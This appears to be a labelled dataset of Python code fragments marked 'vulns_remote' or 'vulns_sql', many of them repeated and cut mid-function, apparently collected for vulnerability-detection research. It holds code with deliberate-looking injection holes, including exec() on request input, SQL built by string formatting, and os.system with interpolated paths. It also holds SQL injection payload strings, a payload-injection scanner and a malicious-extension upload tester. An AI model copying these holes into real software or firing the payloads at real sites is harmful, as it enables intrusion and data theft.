"from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch",vulns_remote
"from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files",vulns_remote
"from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError",vulns_remote
"    def protected(self):        return self.exists and not os.access(self.file, os.W_OK)        if not self.exists and lstat(self.file):",vulns_remote
"    def touch(self):            lutime(self.file, None)",vulns_remote
"        return IOFile(apply_wildcards(f, wildcards,                      rule=self.rule)",vulns_remote
        return flag in value.flags,vulns_remote
"    annotated = flag(value, ""dynamic"")",vulns_remote
"from snakemake.io import IOFile, Wildcards, Resources, _IOFile",vulns_remote
"                    yield IOFile(f, self.rule)",vulns_remote
"0,",vulns_remote
"                        expansion[i].append(IOFile(e, rule=branch))",vulns_remote
"from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch",vulns_remote
"from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files",vulns_remote
"from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError",vulns_remote
"    def protected(self):        return self.exists and not os.access(self.file, os.W_OK)        if not self.exists and lstat(self.file):",vulns_remote
"    def touch(self):            lutime(self.file, None)",vulns_remote
"        return IOFile(apply_wildcards(f, wildcards,                      rule=self.rule)",vulns_remote
        return flag in value.flags,vulns_remote
"    annotated = flag(value, ""dynamic"")",vulns_remote
"from snakemake.io import IOFile, Wildcards, Resources, _IOFile",vulns_remote
"                    yield IOFile(f, self.rule)",vulns_remote
"0,",vulns_remote
"                        expansion[i].append(IOFile(e, rule=branch))",vulns_remote
"from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch",vulns_remote
"from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files",vulns_remote
"from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError",vulns_remote
"    def protected(self):        return self.exists and not os.access(self.file, os.W_OK)        if not self.exists and lstat(self.file):",vulns_remote
"    def touch(self):            lutime(self.file, None)",vulns_remote
"        return IOFile(apply_wildcards(f, wildcards,                      rule=self.rule)",vulns_remote
        return flag in value.flags,vulns_remote
"    annotated = flag(value, ""dynamic"")",vulns_remote
"from snakemake.io import IOFile, Wildcards, Resources, _IOFile",vulns_remote
"                    yield IOFile(f, self.rule)",vulns_remote
"0,",vulns_remote
"                        expansion[i].append(IOFile(e, rule=branch))",vulns_remote
"from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch",vulns_remote
import sys,vulns_remote
"@require_GETdef form(request):    """"""Response get form ajax call, most using in dialog""""""    internal_parameters = ['app_form', 'format']    parameters = strip_parameters(request.GET, internal_parameters)    q_app_form = request.GET.get('app_form')    q_format = request.GET.get('format')    if not q_format:        q_format = 'p'    if not q_app_form:        return HttpResponse('Unrecognizable app_form')    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))    __import__('tcms.%s.forms' % q_app)    q_app_module = sys.modules['tcms.%s.forms' % q_app]    form_class = getattr(q_app_module, q_form)    form_params = form_class(initial=parameters)    html = getattr(form_params, 'as_' + q_format)    return HttpResponse(html())",vulns_remote
from tcms.testcases.forms import CaseAutomatedForm,vulns_remote
"class TestGetForm(test.TestCase):    """"""Test case for form""""""    def test_get_form(self):        response = self.client.get(reverse('ajax-form'),                                   {'app_form': 'testcases.CaseAutomatedForm'})        form = CaseAutomatedForm()        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())",vulns_remote
"    def execute(self):        """""" """"""        self._out = self.execute_queued()",vulns_remote
    def execute(self):,vulns_remote
    def execute(self):,vulns_remote
    @abc.abstractmethod,vulns_remote
    def execute(self):,vulns_remote
"    def execute(self):        """""" """"""        self._out = self.execute_queued()",vulns_remote
    ),vulns_remote
            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client ),vulns_remote
"                include_work_dir_outputs=remote_work_dir_copy,",vulns_remote
        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )        if not remote_work_dir_copy:            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )        else:            work_dir_outputs = [],vulns_remote
    @staticmethod    def __remote_work_dir_copy( lwr_client ):        return LwrJobRunner.__remote_metadata( lwr_client ),vulns_remote
        return command.execute(),vulns_remote
"            print ""Bad argument""",vulns_remote
            return 0,vulns_remote
"                print ""%s: Mount: %s"" % (node, client.status_info)",vulns_remote
"            if rc == RC_OK:                if vlevel > 0:                    print ""Mount successful.""            elif rc == RC_RUNTIME_ERROR:                for nodes, msg in fs.proxy_errors:                    print ""%s: %s"" % (nodes, msg)",vulns_remote
"            print ""OSError""            raise",vulns_remote
            return rc,vulns_remote
        result = -1,vulns_remote
"            if view == ""fs"":                self.status_view_fs(fs)            elif view.startswith(""target""):                self.status_view_targets(fs)            elif view.startswith(""disk""):                self.status_view_disks(fs)            else:                raise CommandBadParameterError(self.view_support.get_view(),                        ""fs, targets, disks"")",vulns_remote
"                print ""%s: Umount: %s"" % (node, client.status_info)",vulns_remote
"                    print ""Unmount successful.""",vulns_remote
"            return RC_USER_ERROR            return RC_RUNTIME_ERROR            return RC_USER_ERROR            return RC_USER_ERROR            print ""Error - Unrecognized action""            print        return 1",vulns_remote
            if rc >= 126:,vulns_remote
        return command.execute(),vulns_remote
"            print ""Bad argument""",vulns_remote
            return 0,vulns_remote
"                print ""%s: Mount: %s"" % (node, client.status_info)",vulns_remote
"            if rc == RC_OK:                if vlevel > 0:                    print ""Mount successful.""            elif rc == RC_RUNTIME_ERROR:                for nodes, msg in fs.proxy_errors:                    print ""%s: %s"" % (nodes, msg)",vulns_remote
"            print ""OSError""            raise",vulns_remote
            return rc,vulns_remote
        result = -1,vulns_remote
"            if view == ""fs"":                self.status_view_fs(fs)            elif view.startswith(""target""):                self.status_view_targets(fs)            elif view.startswith(""disk""):                self.status_view_disks(fs)            else:                raise CommandBadParameterError(self.view_support.get_view(),                        ""fs, targets, disks"")",vulns_remote
"                print ""%s: Umount: %s"" % (node, client.status_info)",vulns_remote
"                    print ""Unmount successful.""",vulns_remote
"            return RC_USER_ERROR            return RC_RUNTIME_ERROR            return RC_USER_ERROR            return RC_USER_ERROR            print ""Error - Unrecognized action""            print        return 1",vulns_remote
            if rc >= 126:,vulns_remote
        return command.execute(),vulns_remote
"            print ""Bad argument""",vulns_remote
            return 0,vulns_remote
"                print ""%s: Mount: %s"" % (node, client.status_info)",vulns_remote
"            if rc == RC_OK:                if vlevel > 0:                    print ""Mount successful.""            elif rc == RC_RUNTIME_ERROR:                for nodes, msg in fs.proxy_errors:                    print ""%s: %s"" % (nodes, msg)",vulns_remote
"            print ""OSError""            raise",vulns_remote
            return rc,vulns_remote
        result = -1,vulns_remote
"            if view == ""fs"":                self.status_view_fs(fs)            elif view.startswith(""target""):                self.status_view_targets(fs)            elif view.startswith(""disk""):                self.status_view_disks(fs)            else:                raise CommandBadParameterError(self.view_support.get_view(),                        ""fs, targets, disks"")",vulns_remote
"                print ""%s: Umount: %s"" % (node, client.status_info)",vulns_remote
"                    print ""Unmount successful.""",vulns_remote
"            return RC_USER_ERROR            return RC_RUNTIME_ERROR            return RC_USER_ERROR            return RC_USER_ERROR            print ""Error - Unrecognized action""            print        return 1",vulns_remote
            if rc >= 126:,vulns_remote
        self.reply_lock = threading.Lock(),vulns_remote
"    def reply(self, text, notice=None, source=None, private=None, force_privmsg_in_private=False,        """"""Replies to the last caller in the right context (channel or PM).""""""        with self.reply_lock:            if private is None:                private = conf.conf['bot'].get(""prefer_private_replies"")            if private or (self.called_in in self.users):                if not force_privmsg_in_private:                    notice = True                target = self.called_by            else:                target = self.called_in            self.msg(target, text, notice=notice, source=source, loopback=loopback)",vulns_remote
"    old_reply = remoteirc.reply            remoteirc.reply = types.MethodType(_remote_reply, remoteirc)            remoteirc.reply = old_reply",vulns_remote
"from benchmark import config, data_service",vulns_remote
"    benchmark_exec_parser.add_argument(""--label"", type=str, default=""run"", metavar=""RUN_LABEL"",",vulns_remote
"    input_directory = ""./data/input/""    download_directory = input_directory + ""download/""    temp_directory = ""./data/temp/""    vcf_directory = ""./data/vcf/""    zarr_directory_setup = ""./data/zarr/""    zarr_directory_benchmark = ""./data/zarr_benchmark/""",vulns_remote
        data_service.remove_directory_tree(vcf_directory)        data_service.remove_directory_tree(zarr_directory_setup),vulns_remote
"            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)        data_service.process_data_files(input_dir=input_directory,                                        temp_dir=temp_directory,                                        output_dir=vcf_directory)            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,                                           output_zarr_dir=zarr_directory_setup,        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)",vulns_remote
"def run_benchmark(bench_conf):    passdef run_dynamic(ftp_location):    passdef run_static():    passdef get_remote_files(ftp_server, ftp_directory, files=None):    passdef record_runtime(benchmark, timestamp):    passdef main():    pass",vulns_remote
"from numcodecs import Blosc, LZ4, LZMAfrom benchmark import config",vulns_remote
"def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):",vulns_remote
"        print(""[VCF-Zarr] Using {} compressor."".format(conversion_config.compressor))        print(""[VCF-Zarr] Performing VCF to Zarr conversion..."")        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,        print(""[VCF-Zarr] Done."")",vulns_remote
    benchmark_allele_count = False,vulns_remote
"                if ""benchmark_allele_count"" in runtime_config.benchmark:                    self.benchmark_allele_count = config_str_to_bool(runtime_config.benchmark[""benchmark_allele_count""])",vulns_remote
    benchmark_PCA = False,vulns_remote
"                if ""benchmark_PCA"" in runtime_config.benchmark:                    self.benchmark_PCA = config_str_to_bool(runtime_config.benchmark[""benchmark_PCA""])",vulns_remote
            socks = self.p.poll(),vulns_remote
            if not reqid in self.response_handlers:,vulns_remote
"        args = [interface, method, make_auth_hash(interface, method, reqid, key)]                args = [interface, method, make_auth_hash(interface, method, reqid, key)]        ",vulns_remote
        self.wz_poll_timeout = 30,vulns_remote
"        def term_handler(interface, method, data):                repr((interface, method, data)))        def resumehandler(interface, method, data):            self.log.info('Resume signal %s recieved',                repr((interface, method, data)))        self.wz.set_sig_handler(b'WZWorker', b'resume', term_handler)        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz",vulns_remote
"        s, p, t, wz = self.wz_sock, self.poll, self.sleep_ticker, self.wz",vulns_remote
                    raise beon.PermanentError(,vulns_remote
    def unbind_methods(self):  ,vulns_remote
        self.poll(timeout * 1000)            except Resume as e:            socks = dict(self.poller.poll(timeout if timeout != None,vulns_remote
            },vulns_remote
if c.no_shell:    while True:        time.sleep(1)else:    try:        import IPython    except ImportError:,vulns_remote
"                self.log.info('Removing %s from targets', t)",vulns_remote
        for f in self.forums:,vulns_remote
                if (t in self.pc.sets['closed']                    or t in self.pc.sets['bumplimit']                    or t in self.targets):,vulns_remote
        self.sets['targets'] = set(),vulns_remote
"                result.extend(map(lambda x:x.decode('utf-8'), data))                self.log.warn('Status {0}, reauthentificating'.\",vulns_remote
                self.w.p.poll(),vulns_remote
        ptarget = (':'.join(tpair) if tuser else target),vulns_remote
            if self.options is not None and self.options.daemon:,vulns_remote
"                if self.options.trace:                    pdb.post_mortem(sys.exc_info()[2])  # pragma: no cover    def executer(self, *args):",vulns_remote
"	def uploadFile(self,suffix,mime,payload) :			filename = os.path.basename(fd.name)",vulns_remote
"		return (fu,filename)",vulns_remote
"	def submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :		fu = self.uploadFile(suffix,mime,payload)",vulns_remote
"					url = self.schema+""://""+self.host+""/""+self.uploadsFolder+""/""+fu[1]",vulns_remote
"	nastyExt = template[""nastyExt""]	nastyMime = getMime(extensions,nastyExt)	nastyExtVariants = template[""extVariants""]	for t in techniques :		for nastyVariant in [nastyExt]+nastyExtVariants :			for legitExt in up.validExtensions :				legitMime = getMime(extensions,legitExt)				mime = legitMime if t[""mime""] == ""legit"" else nastyMime				suffix = t[""suffix""].replace(""$legitExt$"",legitExt).replace(""$nastyExt$"",nastyVariant)				attempts.append({""suffix"":suffix,""mime"":mime,""templateName"":template[""templateName""]})",vulns_remote
"			f = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)",vulns_remote
"	def uploadFile(self,suffix,mime,payload) :			filename = os.path.basename(fd.name)",vulns_remote
"		return (fu,filename)",vulns_remote
"	def submitTestCase(self,suffix,mime,payload=None,codeExecRegex=None) :		fu = self.uploadFile(suffix,mime,payload)",vulns_remote
"					url = self.schema+""://""+self.host+""/""+self.uploadsFolder+""/""+fu[1]",vulns_remote
"	nastyExt = template[""nastyExt""]	nastyMime = getMime(extensions,nastyExt)	nastyExtVariants = template[""extVariants""]	for t in techniques :		for nastyVariant in [nastyExt]+nastyExtVariants :			for legitExt in up.validExtensions :				legitMime = getMime(extensions,legitExt)				mime = legitMime if t[""mime""] == ""legit"" else nastyMime				suffix = t[""suffix""].replace(""$legitExt$"",legitExt).replace(""$nastyExt$"",nastyVariant)				attempts.append({""suffix"":suffix,""mime"":mime,""templateName"":template[""templateName""]})",vulns_remote
"			f = executor.submit(up.submitTestCase,suffix,mime,payload,codeExecRegex)",vulns_remote
            remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client ),vulns_remote
"                include_work_dir_outputs=remote_work_dir_copy,",vulns_remote
        remote_work_dir_copy = LwrJobRunner.__remote_work_dir_copy( client )        if not remote_work_dir_copy:            work_dir_outputs = self.get_work_dir_outputs( job_wrapper )        else:            work_dir_outputs = [],vulns_remote
    @staticmethod    def __remote_work_dir_copy( lwr_client ):        return LwrJobRunner.__remote_metadata( lwr_client ),vulns_remote
"    exec_result = self.context.execute_process_synchronously(req, 'cloc', (WorkUnitLabel.TOOL,))",vulns_remote
"  def _create_jardep(cls, name, version):    return cls._create_jardep('scala-library', version)    return cls._create_jardep('scala-compiler', version)  def _key_for_tool_version(cls, tool, version):",vulns_remote
"                            cls._key_for_tool_version('scalac', version),",vulns_remote
"                            cls._key_for_tool_version('scala-repl', version),                            cls._key_for_tool_version('scalastyle', version),",vulns_remote
"      cls.register_jvm_tool(register, cls._key_for_tool_version(key, 'custom'),",vulns_remote
"                                             self._key_for_tool_version(tool, self.version),",vulns_remote
"    return self._key_for_tool_version('scala-repl', self.version)",vulns_remote
"from pants.engine.fs import PathGlobs, PathGlobsAndRootfrom pants.util.dirutil import fast_relpath",vulns_remote
"                              JarDependency('org.pantsbuild', 'zinc-compiler_2.11', '0.0.7'),",vulns_remote
"                              JarDependency('org.pantsbuild', 'zinc-extractor_2.11', '0.0.4')",vulns_remote
"            for a in (self.zinc, self.compiler_bridge, self.compiler_interface)",vulns_remote
"      for entry in self.compile_classpath_entries(classpath_product_key, target, extra_cp_entries)",vulns_remote
    exec_result = self.context.execute_process_synchronously(,vulns_remote
from hashlib import sha1,vulns_remote
"  @memoized_property  def _zinc_cache_dir(self):    """"""A directory where zinc can store compiled copies of the `compiler-bridge`.    The compiler-bridge is specific to each scala version, and is lazily computed by zinc if the    appropriate version does not exist. Eventually it would be great to just fetch this rather    than compiling it.    """"""    hasher = sha1()    for cp_entry in [self._zinc.zinc, self._zinc.compiler_interface, self._zinc.compiler_bridge]:      hasher.update(os.path.relpath(cp_entry, self.get_options().pants_workdir))    key = hasher.hexdigest()[:12]    return os.path.join(self.get_options().pants_bootstrapdir, 'zinc', key)",vulns_remote
    compiler_interface = self._zinc.compiler_interface    compiler_bridge = self._zinc.compiler_bridge    compiler_interface = relative_to_exec_root(compiler_interface)    compiler_bridge = relative_to_exec_root(compiler_bridge),vulns_remote
"    zinc_args.extend(['-compiler-interface', compiler_interface])    zinc_args.extend(['-compiler-bridge', compiler_bridge])    zinc_args.extend(['-zinc-cache-dir', self._zinc_cache_dir])",vulns_remote
        entry.directory_digest for entry in dependency_classpath if entry.directory_digest      if len(directory_digests) != len(dependency_classpath):        for dep in dependency_classpath:,vulns_remote
"      res = self.context.execute_process_synchronously(req, self.name(), [WorkUnitLabel.COMPILER])",vulns_remote
from pants.engine.isolated_process import FallibleExecuteProcessResult,vulns_remote
"  def execute_process_synchronously(self, execute_process_request, name, labels=None):",vulns_remote
from future.utils import PY3,vulns_remote
    return self._home,vulns_remote
  return inject_init.rules() + python_test_runner.rules(),vulns_remote
"@rule(TestResult, [PythonTestsAdaptor, PyTest, PythonSetup, SourceRootConfig])def run_python_test(test_target, pytest, python_setup, source_root_config):",vulns_remote
"    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},",vulns_remote
"    env={'PATH': text_type(os.pathsep.join(python_setup.interpreter_search_paths))},",vulns_remote
from pants.util.objects import SubclassesOf,vulns_remote
"    self.assertIn('USER', os.environ)    with hermetic_environment_as(**{}):      self.assertNotIn('USER', os.environ)    self.assertIn('USER', os.environ)    with hermetic_environment_as(**dict(AAA='333')):      output = subprocess.check_output('env', shell=True).decode('utf-8')      self.assertNotIn('USER=', output)      self.assertIn('AAA', os.environ)      self.assertEqual(os.environ['AAA'], '333')    self.assertIn('USER', os.environ)    self.assertNotIn('AAA', os.environ)    with environment_as(**dict(XXX=UNICODE_CHAR)):      with hermetic_environment_as(**dict(AAA=UNICODE_CHAR)):",vulns_remote
"        return check_component(comp, self.session, self.logger)",vulns_remote
        if len(pids) < 3:,vulns_remote
"from benchmark import config, data_service",vulns_remote
"    benchmark_exec_parser.add_argument(""--label"", type=str, default=""run"", metavar=""RUN_LABEL"",",vulns_remote
"    input_directory = ""./data/input/""    download_directory = input_directory + ""download/""    temp_directory = ""./data/temp/""    vcf_directory = ""./data/vcf/""    zarr_directory_setup = ""./data/zarr/""    zarr_directory_benchmark = ""./data/zarr_benchmark/""",vulns_remote
        data_service.remove_directory_tree(vcf_directory)        data_service.remove_directory_tree(zarr_directory_setup),vulns_remote
"            data_service.fetch_data_via_ftp(ftp_config=ftp_config, local_directory=download_directory)        data_service.process_data_files(input_dir=input_directory,                                        temp_dir=temp_directory,                                        output_dir=vcf_directory)            data_service.setup_vcf_to_zarr(input_vcf_dir=vcf_directory,                                           output_zarr_dir=zarr_directory_setup,        vcf_to_zarr_config = config.VCFtoZarrConfigurationRepresentation(runtime_config)",vulns_remote
"def run_benchmark(bench_conf):    passdef run_dynamic(ftp_location):    passdef run_static():    passdef get_remote_files(ftp_server, ftp_directory, files=None):    passdef record_runtime(benchmark, timestamp):    passdef main():    pass",vulns_remote
"from numcodecs import Blosc, LZ4, LZMAfrom benchmark import config",vulns_remote
"def convert_to_zarr(input_vcf_path, output_zarr_path, conversion_config):",vulns_remote
"        print(""[VCF-Zarr] Using {} compressor."".format(conversion_config.compressor))        print(""[VCF-Zarr] Performing VCF to Zarr conversion..."")        allel.vcf_to_zarr(input_vcf_path, output_zarr_path, alt_number=alt_number, overwrite=True,        print(""[VCF-Zarr] Done."")",vulns_remote
    WHERE parent_id IN ({list_root_ids}),vulns_sql
"        query = SQL_RECURSIVE_QUERY_EDUCATION_GROUP.format(list_root_ids=','.join(str(root_id) for root_id in root_ids))        cursor.execute(query)",vulns_sql
        query = '''SELECT mapped_by as contributors from tasks where project_id = {0} and  mapped_by is not null                   SELECT validated_by from tasks where tasks.project_id = {0} and validated_by is not null'''.format(project_id)        contributors = db.engine.execute(query),vulns_sql
"                WHERE action='LOCKED_FOR_MAPPING'                and user_id = {0} and project_id = {1};"""""".format(user_id, self.id)        total_mapping_time = db.engine.execute(query)",vulns_sql
"                        WHERE action='LOCKED_FOR_VALIDATION'                        and user_id = {0} and project_id = {1};"""""".format(user_id, self.id)        total_validation_time = db.engine.execute(query)",vulns_sql
"        sql = '''SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history                 WHERE action='LOCKED_FOR_MAPPING'and project_id = {0};'''.format(self.id)        total_mapping_time = db.engine.execute(sql)",vulns_sql
"        sql = '''SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history                WHERE action='LOCKED_FOR_VALIDATION' and project_id = {0};'''.format(self.id)        total_validation_time = db.engine.execute(sql)",vulns_sql
"            AND t.project_id = {0}            AND th.action_date <= '{1}'            '''.format(project_id, str(expiry_date))        old_tasks = db.engine.execute(old_locks_query)",vulns_sql
"                       and t.project_id = {0}                     group by u.username, u.mapping_level, u.date_registered, u.last_validation_date"""""".format(project_id)        results = db.engine.execute(sql)",vulns_sql
"        sql = """"""select max(id) from tasks where project_id = {0} GROUP BY project_id"""""".format(project_id)        result = db.engine.execute(sql)",vulns_sql
from sqlalchemy import desc,vulns_sql
"        sql = ""select * from users where id = {0} and projects_mapped @> '{{{1}}}'"".format(user_id, project_id)        result = db.engine.execute(sql)                    set projects_mapped = array_append(projects_mapped, {0})                  where id = {1}'''.format(project_id, user_id)        db.engine.execute(sql)",vulns_sql
                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})                                   AND t.validated_by = {0}                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = {0})                            AND t.mapped_by = {0}                   WHERE p.id = c.project_id ORDER BY p.id DESC'''.format(user_id)        results = db.engine.execute(sql),vulns_sql
"                and user_id = {0};"""""".format(self.id)        total_validation_time = db.engine.execute(sql)",vulns_sql
"                and user_id = {0};"""""".format(self.id)        total_mapping_time = db.engine.execute(sql)",vulns_sql
                                      and t.project_id = {0}                                      and t.project_id = {0}        '''.format(project_id)        results = db.engine.execute(contrib_query),vulns_sql
"                and user_id = {0};"""""".format(user.id)        total_validation_time = db.engine.execute(sql)",vulns_sql
"                and user_id = {0};"""""".format(user.id)        total_mapping_time = db.engine.execute(sql)",vulns_sql
"        text_query_str = str(text_query) # SQLObject chokes on unicode.        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str        return self.select(sql_query)",vulns_sql
"        text_query_str = str(text_query) # SQLObject chokes on unicode.        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str        return self.select(sql_query)",vulns_sql
"        text_query_str = str(text_query) # SQLObject chokes on unicode.        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str        return self.select(sql_query)",vulns_sql
"        text_query_str = str(text_query) # SQLObject chokes on unicode.        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str        return self.select(sql_query)",vulns_sql
"        text_query_str = str(text_query) # SQLObject chokes on unicode.        sql_query = ""UPPER(tag.name) LIKE UPPER('%%%s%%')"" % text_query_str        return self.select(sql_query)",vulns_sql
"                    logging.debug(""SQL: %s"", command)",vulns_sql
"        search = convert_search(search)            post = "" AND (CATEGORY = '""            post += ""' OR CATEGORY = '"".join(categories)            post += ""' )""        res = self.execute(cmd + post, (search,))",vulns_sql
"        t = (search, start, limit)        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', t)",vulns_sql
__version__ = '0.4.45',vulns_sql
"            self.execute(""BEGIN; SET LOCAL statement_timeout = '1min'; ANALYZE %s; COMMIT;"" % table)",vulns_sql
"        content = self.st_db.execute(""SELECT content FROM file_storage WHERE uuid = '%d';"" % uuid_)",vulns_sql
from bzs import filesfrom bzs import users,vulns_sql
            for file_name in os.listdir(target_path):                try: # In case of a permission error.                    attrib['allow-edit'] = True                    attrib['file-size'] = files.format_file_size(os.path.getsize(actual_path))                    attrib['owner'] = 'root'                    attrib['date-uploaded'] = time.ctime(os.path.getctime(actual_path))                    if os.path.isdir(actual_path):,vulns_sql
"        try:            file_handle = open(file_path, 'rb')        except Exception:            invoke_404()            return        file_data = file_handle.read()        file_handle.close()",vulns_sql
        file_block_size = 64 * 1024 # 64 KiB / Chunk        file_block = bytes(),vulns_sql
"                    os.system('cp ""D:%s"" ""D:%s""' % (source, target))                    os.system('mv ""D:%s"" ""D:%s""' % (source, target))                    os.system('rm ""D:%s""' % source)                os.system('rename ""D:%s"" ""%s""' % (sources, target))                os.system('mkdir ""D:%s%s""' % (sources, target))",vulns_sql
"            def get_non_duplicate_path(file_path):                if not os.path.exists('D:' + file_path):                    return file_path                duplicate = 1                while duplicate < 101:                    new_path = re.sub(r'\.(.*?)$', ' (%d).\\1' % duplicate, file_path)                    if not os.path.exists('D:' + new_path):                        return new_path                    duplicate = duplicate + 1                return ''            file_path = get_non_duplicate_path(target_path + file_name)            if not file_path:                future.set_result('bzs_upload_failure')                return            file_stream = open(file_path, 'wb')            file_stream.write(upload_data)            file_stream.close()",vulns_sql
"	url = ""/serverside/eval2.php""	payloads = ssci.get_all(url)	for payload in payloads:		injectPayload(url, ""page"", ""POST"", payload)",vulns_sql
"	payloads = [""' or '1=1""]",vulns_sql
"	if attackType == sql_injection:		falsePayload = sqli.get_false()[0]		badhtml = """"		if method == ""GET"":			getURL = url + ""?"" + paramname+""=""+falsePayload			content = requests.get(getURL)			badhtml =  content.text		elif method == ""POST"":			content = requests.post(url, data={paramname:falsePayload})			badhtml = content.text		compare_res = sqli.compare_html(badhtml, html)				match = re.findall(r'<ins>.+', compare_res)		return None",vulns_sql
	get_payloads(v=True),vulns_sql
"	 	injectPayload(url, ""redirect"", ""GET"", payload)",vulns_sql
"    payloads = get_payloads()        injectPayload(url_list[0], 'ascii', 'GET', payload)        injectPayload(url_list[1], ""host"", 'POST', payload)",vulns_sql
"	payloads = [""' and '1=2"", ""' or '1'='1""]",vulns_sql
"	payloads = [""' or '1=1"",   ""'1 'or' 1'='1"",""' or '1'='1"",  ""'or 1=1#"", ""' OR '1=1 %00""]",vulns_sql
"        if(content.status_code==200) and badhtml[1]==html:            compare_res = sqli.compare_html(badhtml[0], html)  ",vulns_sql
"query = ""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + valcur.execute(""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + val)",vulns_sql
"            'SEVERITY': {'MEDIUM': 12},            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}",vulns_sql
"query = ""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + valcur.execute(""SELECT "" + val + "" FROM "" + val +"" WHERE id = "" + val)",vulns_sql
"            'SEVERITY': {'MEDIUM': 12},            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}",vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
"MIDDLEWARE_CLASSES = (    'lib.middleware.SqlInjectionMiddleware',)",vulns_sql
"                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),",vulns_sql
"                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),",vulns_sql
"                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),",vulns_sql
"                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),",vulns_sql
"                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),",vulns_sql
"                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),",vulns_sql
"                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),",vulns_sql
"                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),",vulns_sql
"            field=models.ForeignKey(to='contenttypes.ContentType'),            field=models.ForeignKey(to='contenttypes.ContentType'),",vulns_sql
    profile = user.userprofile if user.is_authenticated() else None,vulns_sql
        if not request.user.is_authenticated():,vulns_sql
        profile = user.userprofile if user and user.is_authenticated() else None,vulns_sql
"                ('course', models.ForeignKey(related_name='instances', to='course.Course')),",vulns_sql
"            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance'),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),",vulns_sql
"                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule')),",vulns_sql
"            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children'),",vulns_sql
"                ('course_instance', models.ForeignKey(to='course.CourseInstance')),                ('user_profile', models.ForeignKey(to='userprofile.UserProfile')),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance')),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance')),",vulns_sql
"                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance')),                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag')),                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile')),",vulns_sql
            if not user.is_authenticated():,vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
"                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),",vulns_sql
"                ('exercise', models.ForeignKey(to='exercise.BaseExercise')),                ('submitter', models.ForeignKey(to='userprofile.UserProfile')),",vulns_sql
    if not (diploma_design and cached_points.user.is_authenticated()):,vulns_sql
"                ('design', models.ForeignKey(to='diploma.CourseDiplomaDesign')),",vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
    if design and points.user.is_authenticated():,vulns_sql
from django.core.urlresolvers import reverse,vulns_sql
        if user.is_authenticated():,vulns_sql
        if self.user and self.user.is_authenticated():,vulns_sql
